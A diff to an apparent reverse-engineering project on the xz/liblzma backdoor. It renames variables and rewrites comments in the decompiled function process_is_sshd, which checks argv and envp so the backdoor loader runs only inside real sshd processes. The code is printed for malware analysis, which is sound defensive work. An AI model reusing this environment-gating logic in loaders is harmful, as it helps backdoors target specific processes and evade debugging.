@@ -5,11 +5,7 @@
 
 
 /*
- * AutoDoc: Replays sshd's argc/argv/envp layout straight off the stack pointer: it checks that argc is sane, argv[0] points above
- * the stack and hashes to `/usr/sbin/sshd`, and every subsequent argv entry lives within 0x4000 bytes of the saved SP.
- * Each argument is passed through `check_argument`, and once it reaches envp it enforces that every pointer is either
- * stack-resident or located inside sshd's .data segment. Any environment string that matches a known identifier (via
- * `get_string_id`) or falls outside those regions terminates the probe so the loader only runs inside real sshd processes.
+ * AutoDoc: Walks the argc/argv/envp layout straight off the caller’s stack pointer and only returns TRUE when the process really looks like sshd. It demands a sane argc, an argv[0] pointer that lives on the stack and hashes to `/usr/sbin/sshd`, and then walks argv[1…] ensuring every pointer stays within 0x4000 bytes of the saved SP and never triggers `check_argument`’s debug filter. Once argv terminates, envp entries must either remain stack-resident or fall inside sshd’s writable `.data/.bss` span, and any environment string that maps to a known encoded ID aborts the probe.
  */
 
 #include "xzre_types.h"
@@ -17,69 +13,73 @@
 BOOL process_is_sshd(elf_info_t *elf,u8 *stack_end)
 
 {
-  long lVar1;
-  u8 *puVar2;
-  EncodedStringId EVar3;
-  char *pcVar4;
-  u8 *puVar5;
-  long lVar6;
-  ulong *puVar7;
-  BOOL more_args_to_scan;
-  u8 *data_segment;
-  ulong *envp;
   long argc;
-  u8 *argv0;
+  u8 *argv_entry;
+  EncodedStringId EVar3;
+  char *debug_match;
+  u8 *data_segment_base;
+  long arg_index;
+  ulong *env_cursor;
+  BOOL more_args_to_scan;
+  u64 data_segment_bounds[2];
   
   if (((((&stack0xfffffffffffffff8 < stack_end) &&
         ((ulong)((long)stack_end - (long)&stack0xfffffffffffffff8) < 0x2001)) &&
-       (lVar1 = *(long *)stack_end, lVar1 - 1U < 0x20)) &&
-      ((puVar2 = *(u8 **)(stack_end + 8), stack_end < puVar2 && (puVar2 != (u8 *)0x0)))) &&
-     ((ulong)((long)puVar2 - (long)stack_end) < 0x4001)) {
-    EVar3 = get_string_id((char *)puVar2,(char *)0x0);
-    lVar6 = 1;
+       (argc = *(long *)stack_end, argc - 1U < 0x20)) &&
+      ((argv_entry = *(u8 **)(stack_end + 8), stack_end < argv_entry && (argv_entry != (u8 *)0x0)))) &&
+     ((ulong)((long)argv_entry - (long)stack_end) < 0x4001)) {
+    // AutoDoc: Hash argv[0] and insist it decodes to `/usr/sbin/sshd` before scanning any further.
+    EVar3 = get_string_id((char *)argv_entry,(char *)0x0);
+    arg_index = 1;
     if (EVar3 == STR_usr_sbin_sshd) {
-      while (more_args_to_scan = lVar6 != lVar1, lVar6 = lVar6 + 1, more_args_to_scan) {
-        puVar2 = *(u8 **)(stack_end + lVar6 * 8);
-        if (puVar2 <= stack_end) {
+      // AutoDoc: Iterate over argv[1..argc-1], checking each pointer range before handing it to the debug filter.
+      while (more_args_to_scan = arg_index != argc, arg_index = arg_index + 1, more_args_to_scan) {
+        argv_entry = *(u8 **)(stack_end + arg_index * 8);
+        if (argv_entry <= stack_end) {
           return FALSE;
         }
-        if (puVar2 == (u8 *)0x0) {
+        if (argv_entry == (u8 *)0x0) {
           return FALSE;
         }
-        if (0x4000 < (ulong)((long)puVar2 - (long)stack_end)) {
+        if (0x4000 < (ulong)((long)argv_entry - (long)stack_end)) {
           return FALSE;
         }
-        pcVar4 = check_argument((char)*(undefined2 *)puVar2,(char *)puVar2);
-        if (pcVar4 != (char *)0x0) {
+        // AutoDoc: Let the helper spot strings containing lowercase `d` so sshd’s debug modes never reach the hooks.
+        debug_match = check_argument((char)*(undefined2 *)argv_entry,(char *)argv_entry);
+        if (debug_match != (char *)0x0) {
           return FALSE;
         }
       }
-      if (*(long *)(stack_end + lVar6 * 8) == 0) {
-        puVar7 = (ulong *)(stack_end + lVar6 * 8 + 8);
+      // AutoDoc: Switch to envp processing only after confirming argv was NULL-terminated.
+      if (*(long *)(stack_end + arg_index * 8) == 0) {
+        env_cursor = (ulong *)(stack_end + arg_index * 8 + 8);
         do {
-          puVar2 = (u8 *)*puVar7;
-          if (puVar2 == (u8 *)0x0) {
+          argv_entry = (u8 *)*env_cursor;
+          if (argv_entry == (u8 *)0x0) {
             return FALSE;
           }
-          if ((puVar2 <= stack_end) || (0x4000 < (ulong)((long)puVar2 - (long)stack_end))) {
-            argv0 = (u8 *)0x0;
-            puVar5 = (u8 *)elf_get_data_segment(elf,(u64 *)&argv0,TRUE);
-            if (puVar5 == (u8 *)0x0) {
+          // AutoDoc: Stack-relative argv/env pointers must land within 0x4000 bytes of the saved SP; anything else falls through to the `.data` guard.
+          if ((argv_entry <= stack_end) || (0x4000 < (ulong)((long)argv_entry - (long)stack_end))) {
+            data_segment_bounds[0] = 0;
+            // AutoDoc: When env pointers leave the stack, demand that they reside inside sshd’s writable `.data/.bss` range.
+            data_segment_base = (u8 *)elf_get_data_segment(elf,data_segment_bounds,TRUE);
+            if (data_segment_base == (u8 *)0x0) {
               return FALSE;
             }
-            if (argv0 + (long)puVar5 < puVar2 + 0x2c) {
+            if (data_segment_base + data_segment_bounds[0] < argv_entry + 0x2c) {
               return FALSE;
             }
-            if (puVar2 < puVar5) {
+            if (argv_entry < data_segment_base) {
               return FALSE;
             }
           }
-          EVar3 = get_string_id((char *)*puVar7,(char *)0x0);
+          // AutoDoc: Known environment keys (non-zero encoded IDs) are treated as hostile and abort the probe immediately.
+          EVar3 = get_string_id((char *)*env_cursor,(char *)0x0);
           if (EVar3 != 0) {
             return FALSE;
           }
-          puVar7 = puVar7 + 1;
-        } while (*puVar7 != 0);
+          env_cursor = env_cursor + 1;
+        } while (*env_cursor != 0);
         return TRUE;
       }
     }
